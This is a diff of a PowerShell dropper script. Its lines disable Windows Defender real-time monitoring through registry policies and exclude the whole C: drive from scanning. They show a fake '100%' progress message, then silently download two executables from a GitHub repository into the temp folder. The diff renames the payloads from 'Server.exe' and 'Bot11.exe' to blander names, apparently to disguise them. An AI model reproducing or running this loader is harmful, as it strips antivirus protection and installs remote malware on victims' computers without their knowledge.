@@ -16,10 +16,10 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 Write-Host "100%"
-$url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Server.exe"
-$url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Bot11.exe"
-$path1 = "$env:TEMP\Server.exe"
-$path2 = "$env:TEMP\Bot11.exe"
+$url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/bin.exe"
+$url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/dll.exe"
+$path1 = "$env:TEMP\bin.exe"
+$path2 = "$env:TEMP\dll.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
